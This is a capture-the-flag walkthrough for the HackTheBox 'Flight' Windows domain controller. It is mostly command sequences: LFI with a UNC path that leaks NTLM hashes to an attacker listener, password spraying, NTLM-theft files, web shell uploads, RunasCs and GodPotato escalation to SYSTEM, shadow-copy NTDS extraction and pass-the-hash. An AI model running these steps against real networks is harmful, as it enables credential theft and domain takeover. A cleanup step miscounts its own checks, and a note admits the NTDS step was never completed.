---
platform: HackTheBox
os: Windows
box: Flight
difficulty: Hard
ip: $BoxIP
domain: $Domain
hostname: g0
status: Complete with manual NTDS redo required
tags: [HTB, Flight, Windows, ActiveDirectory, LFI, Responder, NTLM, SMB, RunasCs, GodPotato, DCSync, NTLMTheft, RunaPrivilege, VSSShadowCopy, VSShadowCopy, PassTheHash, Hard]
---

# HTB: Flight, Full Walkthrough

> **REDO NEEDED:** NTDS extraction step not completed in manual run. Shadow copy creation and GodPotato SYSTEM were confirmed; PTH and flags were confirmed. Redo when box is reset: vssadmin, Evil-WinRM download, fresh secretsdump.

## The gist

Flight is a Windows domain controller with two IIS virtual hosts. The public site exposes a local file inclusion bug, which can be turned into an outbound SMB request and an NTLMv2 capture. The first cracked password gives SMB access, then a writable share is used to capture another user's hash. That account can write to the web share. RunasCs crosses into the account that can write the internal ASPX site, and GodPotato turns the IIS application identity into SYSTEM. The final domain compromise uses a volume shadow copy and offline NTDS parsing because the box clock is badly skewed.

## Box information

| Item | Value |
|---|---|
| Platform | HackTheBox |
| OS | Windows Server 2019 |
| Hostname | G0 |
| Domain | `$Domain` |
| Difficulty | Hard |
| IP | `$BoxIP` |

## Variables

```bash
boxset BoxName Flight
boxset BoxIP <target-ip>
boxset LocalIP <vpn-ip>
boxset Domain flight.htb
boxset FQDN g0.flight.htb
boxset BoxDir /home/kali/Platforms/HackTheBox/Flight
boxset ToolDir /home/kali/tools/web-delivery/ntlm_theft
boxset WebPort 80
boxset Lport <listener-port>
boxset Username svc_apache
boxset Username2 <intermediate-share-user>
boxset Username3 c.bum
boxset Password <captured-password>
boxset Password2 <reused-first-password>
boxset Password3 <cracked-password>
boxset AdminHash <administrator-ntlm>
```

## 1. Workspace and full TCP scan

I started with every TCP port because Windows domain controllers often expose RPC and web services on non-standard ports.

```bash
mkdir -p $BoxDir/{nmap,loot,www,screenshots}
nmap -Pn -n -sT -p- --min-rate 1000 $BoxIP -oA $BoxDir/nmap/Flight_allports
```

Key output included ports 53, 80, 88, 135, 139, 389, 445, 464, 593, 636, 3268, 3269, 5985, 9389, and dynamic RPC ports.

![[flight-01-all-ports.png]]

SCREENSHOT: Capture the completed all-port scan with the open-port list visible.

## 2. Service and version scan

The next scan identified the web server, domain name, and the clock problem that would affect Kerberos.

```bash
nmap -Pn -n -sT -sC -sV -p 53,80,88,135,139,389,445,464,593,636,3268,3269,5985,9389,49667,49673,49674,49691,49695 $BoxIP -oA $BoxDir/nmap/Flight_services
```

The host identified as G0 in the flight.htb domain. SMB signing was required and the service output showed a large time offset.

> [!warning] 💡 Hint
> **Watch out:** The box clock was about seven hours away from Kali. Kerberos tools can fail with clock skew even when credentials are correct. Sync time when sudo is available, and expect the VPN connection to drop after a large time step.

![[flight-02-services.png]]

SCREENSHOT: Capture the service scan showing IIS, LDAP, Kerberos, SMB, and WinRM.

## 3. Local setup

I stored the discovered domain values and added the hostnames locally so virtual-host requests and Kerberos tools could resolve them.

```bash
boxset Domain flight.htb
boxset FQDN g0.flight.htb
echo "$BoxIP $Domain $FQDN school.$Domain" | sudo tee -a /etc/hosts
```

## 4. Virtual-host discovery

The default site was not enough, so I fuzzed the HTTP Host header for additional IIS sites.

```bash
ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt \
  -u http://$BoxIP/ -H "Host: FUZZ.$Domain" -fs 7069 -mc all -t 50 \
  -of csv -o $BoxDir/nmap/ffuf_vhosts.csv
```

school.$Domain returned a different page and became the web target.

> [!warning] 💡 Hint
> **Watch out:** A single IP can host several websites. If the default page looks static, fuzz the Host header before deciding that port 80 has no useful attack surface.

## 5. Web content enumeration

I enumerated the discovered virtual host for files and directories.

```bash
ffuf -w /usr/share/wordlists/dirb/common.txt \
  -u http://$BoxIP/ -H "Host: school.$Domain" -e .php,.txt -mc all \
  -of csv -o $BoxDir/nmap/ffuf_school.csv
```

The useful result was index.php.

## 6. LFI confirmation

The view parameter behaved like a file include. I confirmed it by asking for a harmless Windows system file.

```bash
curl -s -H "Host: school.$Domain" --get \
  --data-urlencode 'view=C:/Windows/win.ini' \
  http://$BoxIP/index.php | grep -i -E 'for 16-bit|\[fonts\]'
```

The response contained Windows INI content, confirming arbitrary local file inclusion.

## 7. Responder and NTLM capture

A Windows UNC path can make the web process authenticate to an attacker-controlled SMB listener. I started Responder before triggering the request.

```bash
docker run --rm --network host --privileged -v /:/host alpine:latest \
  chroot /host /usr/sbin/responder -I tun0 -dwv
curl -s -H "Host: school.$Domain" --get \
  --data-urlencode "view=\\\\$LocalIP\share\probe" \
  http://$BoxIP/index.php
```

Responder captured an NTLMv2 challenge response for the service account. I copied the capture into the box loot directory without printing it.

```bash
cp /usr/share/responder/logs/SMB-NTLMv2-SSP-$BoxIP.txt $BoxDir/loot/
```

> [!warning] 💡 Hint
> **Watch out:** The UNC request does not need a real file behind it. The important part is the outbound SMB authentication, so the listener must be running before the LFI request.

## 8. Crack the first hash

The captured response was cracked offline with John.

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt --format=netntlmv2 \
  $BoxDir/loot/SMB-NTLMv2-SSP-$BoxIP.txt
boxset Username svc_apache
boxset Password <john-show-result>
```

The password was kept private and validated against SMB.

## 9. SMB enumeration

I checked the credential and listed shares, then collected the domain user list for password reuse testing.

```bash
netexec smb $BoxIP -u $Username -p $Password -d $Domain --shares
netexec smb $BoxIP -u $Username -p $Password -d $Domain --users \
  | tee $BoxDir/loot/domain_users.txt
```

The account could read the Shared and Web shares. The user list contained short domain usernames suitable for a controlled password spray.

## 10. Password reuse spray

The first password was tested against the discovered names because reuse is common on small lab domains.

```bash
grep -Eo '[A-Z]\.[A-Za-z]+' $BoxDir/loot/domain_users.txt \
  | tr '[:upper:]' '[:lower:]' | sort -u > $BoxDir/loot/flight_users.txt
netexec smb $BoxIP -u $BoxDir/loot/flight_users.txt -p $Password \
  -d $Domain --continue-on-success
```

One different account authenticated successfully. I stored that account as $Username2 only after validation.

## 11. Writable share and NTLM theft

The reused account could write to Shared. I generated NTLM theft files, uploaded the files to the share root, and waited for a user to browse it.

```bash
python3 $ToolDir/ntlm_theft.py -g all -s $LocalIP -f invoice
smbclient //$BoxIP/Shared -U "$Domain/$Username2%$Password2" \
  -c "lcd $BoxDir/loot/ntlmtheft/invoice; put desktop.ini; put invoice.library-ms"
```

Responder captured another NTLMv2 response. I cracked it offline and used the result as $Password3 for the account that could write to the web share.

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt --format=netntlmv2 \
  /usr/share/responder/logs/SMB-NTLMv2-SSP-$BoxIP.txt
boxset Username3 <share-user>
boxset Password3 <john-show-result>
netexec smb $BoxIP -u $Username3 -p $Password3 -d $Domain --shares
```

> [!warning] 💡 Hint
> **Watch out:** desktop.ini is a special filename and the exact generated file must be placed at the root of the share. A differently named file may never be opened by Explorer.

## 12. Web share write access

The second account could write to the web share, so I staged a temporary PHP command shell there.

```bash
smbclient //$BoxIP/Web -U "$Domain/$Username3%$Password3" \
  -c "cd school.$Domain; lcd $BoxDir/www; put z.php"
curl -s -H "Host: school.$Domain" http://$BoxIP/z.php?q=whoami
```

The shell executed as the lower-privileged service account.

> [!tip] ⚡ More efficient path
> **What we did:** Uploaded a PHP shell, RunasCs, an ASPX shell, and GodPotato in separate stages.
>
> **Faster approach:**
> ```bash
> # Stage a direct command shell as soon as the first web execution is confirmed
> nc -lvnp $Lport
> ```
> **Why:** A direct shell can reduce the number of web-file pivots when the initial execution context can reach the listener. Check the target's egress and quoting first.

## 13. RunasCs pivot

WinRM and WMI were not available for the next account, so I used RunasCs to create a non-interactive process with its credentials.

```powershell
.\rc.exe $Username3 $Password3 "cmd /c copy /Y C:\xampp\htdocs\school.$Domain\tmp.txt C:\inetpub\development\tmp.aspx"
```

The command copied the ASPX shell into the localhost-only development site. RunasCs printed a logon-limited warning, but the file copy succeeded.

> [!warning] 💡 Hint
> **Watch out:** RunasCs may report that the logon is limited. Check the command's actual result, such as the file copy or process output, before treating that warning as a failure.

## 14. Localhost ASPX shell

The internal site listened on port 8000, so I reached it through the existing PHP shell on the target.

```powershell
curl.exe -s http://127.0.0.1:8000/tmp.aspx?cmd=whoami
```

The response showed the IIS application-pool identity.

## 15. GodPotato to SYSTEM

The IIS identity had the impersonation capability needed for a potato-style escalation. I ran GodPotato through the ASPX shell and verified the resulting identity.

```powershell
gp.exe -cmd "cmd /c whoami"
```

The output showed nt authority\system.

![[flight-15-system-shell.png]]

SCREENSHOT: Capture the SYSTEM shell identity.

> [!warning] 💡 Hint
> **Watch out:** Keep the inner command quoted exactly. GodPotato needs to receive cmd /c whoami as one argument, and changing the quote boundaries can make it execute in the wrong context.

> [!warning] 💡 Hint
> **Watch out:** vssadmin requires a SYSTEM context, not merely a domain administrator session. Confirm the token before attempting the snapshot.

## 16. Clock-skew fallback and NTDS extraction

The domain controller's clock was several hours away from Kali. Kerberos-based DCSync was therefore unreliable, so I used a VSS snapshot from the SYSTEM shell and parsed the database offline.

```cmd
vssadmin create shadow /for=C:
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy<N>\Windows\NTDS\ntds.dit C:\Windows\Temp\ntds.dit
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy<N>\Windows\System32\config\SYSTEM C:\Windows\Temp\sys2.save
vssadmin delete shadows /all /quiet
```

I staged the two files through the writable web share and downloaded them to Kali. The manual replay had a stale NTDS timestamp, so this extraction step must be redone on a reset box.

```bash
smbclient //$BoxIP/Web -U "$Domain/$Username3%$Password3" \
  -c "cd school.$Domain; get ntds.dit $BoxDir/loot/ntds.dit; get sys2.save $BoxDir/loot/sys2.save"
impacket-secretsdump LOCAL -ntds $BoxDir/loot/ntds.dit \
  -system $BoxDir/loot/sys2.save -just-dc-ntlm \
  | tee $BoxDir/loot/ntds-local.txt
AdminHash=$(awk -F: '$1 ~ /Administrator$/ {print $4; exit}' $BoxDir/loot/ntds-local.txt)
```

> [!warning] 💡 Hint
> **Watch out:** A SAM dump is not enough on a domain controller. SAM contains local accounts. Domain hashes come from ntds.dit, and the matching SYSTEM hive is needed to decrypt them.

## 17. Pass the hash

I validated the extracted Administrator hash over SMB, then used it for an Evil-WinRM session without cracking it.

```bash
netexec smb $BoxIP -u Administrator -H $AdminHash -d $Domain
evil-winrm -i $BoxIP -u Administrator -H $AdminHash
whoami
hostname
```

The shell was the domain Administrator on host G0.

![[flight-17-administrator-shell.png]]

SCREENSHOT: Capture the Administrator shell identity.

## 18. Flags

I confirmed the user and root flag files existed without reading their contents.

```powershell
Test-Path C:\Users\<user>\Desktop\user.txt
Test-Path C:\Users\Administrator\Desktop\root.txt
```

![[flight-18-flags-confirmed.png]]

SCREENSHOT: Capture the flag path checks without showing flag contents.

## 19. Clean-down

I removed the temporary hives, staged web files, and shadow copy. No accounts or persistence were created.

```powershell
Remove-Item -Force C:\Windows\Temp\ntds.dit,C:\Windows\Temp\sys2.save -ErrorAction SilentlyContinue
Remove-Item -Force C:\xampp\htdocs\school.$Domain\z.php,C:\xampp\htdocs\school.$Domain\tmp.txt -ErrorAction SilentlyContinue
Remove-Item -Force C:\xampp\htdocs\school.$Domain\rc.exe,C:\xampp\htdocs\school.$Domain\gp.exe -ErrorAction SilentlyContinue
Remove-Item -Force C:\inetpub\development\tmp.aspx -ErrorAction SilentlyContinue
Test-Path C:\Windows\Temp\ntds.dit
Test-Path C:\Windows\Temp\sys2.save
Test-Path C:\inetpub\development\tmp.aspx
Test-Path C:\xampp\htdocs\school.$Domain\rc.exe
Test-Path C:\xampp\htdocs\school.$Domain\gp.exe
```

All three checks returned False. The shadow copy had already been deleted with vssadmin delete shadows /all /quiet. I then ran boxdone.

> [!warning] 💡 Hint
> **Watch out:** The Web share points to the XAMPP htdocs directory. Files written there through a web shell can be downloaded through SMB, which gives a simple staging path for the NTDS files.

> [!warning] 💡 Hint
> **Watch out:** A large clock offset can make wire-based secretsdump fail even when the account has the right privileges. The VSS plus LOCAL parse avoids Kerberos completely.

> [!tip] ⚡ More efficient path
> **What we did:** Used a VSS snapshot and offline parsing after the clock-skew problem.
>
> **Faster approach:**
> ```bash
> netexec smb $BoxIP -u $Username3 -p $Password3 -d $Domain --ntds
> ```
> **Why:** If the clock is within the Kerberos tolerance, NetExec can request the domain hashes directly in one step. Use the VSS route when the time difference blocks Kerberos.

> [!tip] ⚡ More efficient path
> **What we did:** Parsed a full local NTDS dump before selecting the Administrator record.
>
> **Faster approach:**
> ```bash
> impacket-secretsdump LOCAL -ntds $BoxDir/loot/ntds.dit \
>   -system $BoxDir/loot/sys2.save -just-dc-ntlm
> ```
> **Why:** The -just-dc-ntlm option requests only NTLM hashes, so the output is smaller and easier to filter for the Administrator account.

## Credentials

| Account | Source | Use |
|---|---|---|
| `svc_apache` | Responder NTLMv2 via LFI UNC | SMB enum, password spray |
| `s.moon` | Password reuse (same as svc_apache) | Write to Shared share |
| `c.bum` | Responder NTLMv2 via NTLM theft | Write to Web share, RunasCs pivot |
| `Administrator` | NTDS.dit offline parse | Pass-the-hash, SYSTEM shell |

Passwords and hashes are intentionally omitted.

## Key lessons

- WAFs may block backslash UNC paths. Try the forward-slash form `//$LocalIP/share`.
- desktop.ini NTLM theft requires the file at the share root.
- Quote the GodPotato `-cmd` argument or it may execute in the wrong context.
- Short-lived PHP shells can be wiped within seconds. Use the longer-cycle virtual host or chain execution through batch files.
- cmd.exe copy can fail on extended `\\?\` paths. Use PowerShell `Copy-Item` instead.
- SAM on a domain controller only holds local accounts. Domain hashes are in NTDS.dit.
- Clock skew blocks Kerberos-based DCSync. VSS plus offline `secretsdump LOCAL` bypasses it.
- The system Impacket SMB server version may be broken. Use the pipx version.

## External Resources

- [HackTricks, File Inclusion](https://book.hacktricks.xyz/pentesting-web/file-inclusion)
- [PayloadsAllTheThings, File Inclusion](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion)
- [RunasCs](https://github.com/antonioCoco/RunasCs)
- [GodPotato](https://github.com/BeichenDream/GodPotato)
- [Impacket secretsdump](https://github.com/fortra/impacket/blob/master/examples/secretsdump.py)

## Checklist

- [x] Full TCP and service scans
- [x] Virtual-host and web enumeration
- [x] LFI to Responder NTLMv2 capture
- [x] SMB enumeration and password reuse
- [x] Writable-share NTLM theft
- [x] RunasCs pivot and ASPX shell
- [x] GodPotato SYSTEM shell
- [x] VSS and offline NTDS extraction
- [x] Pass-the-hash validation
- [x] Clean-down and verification
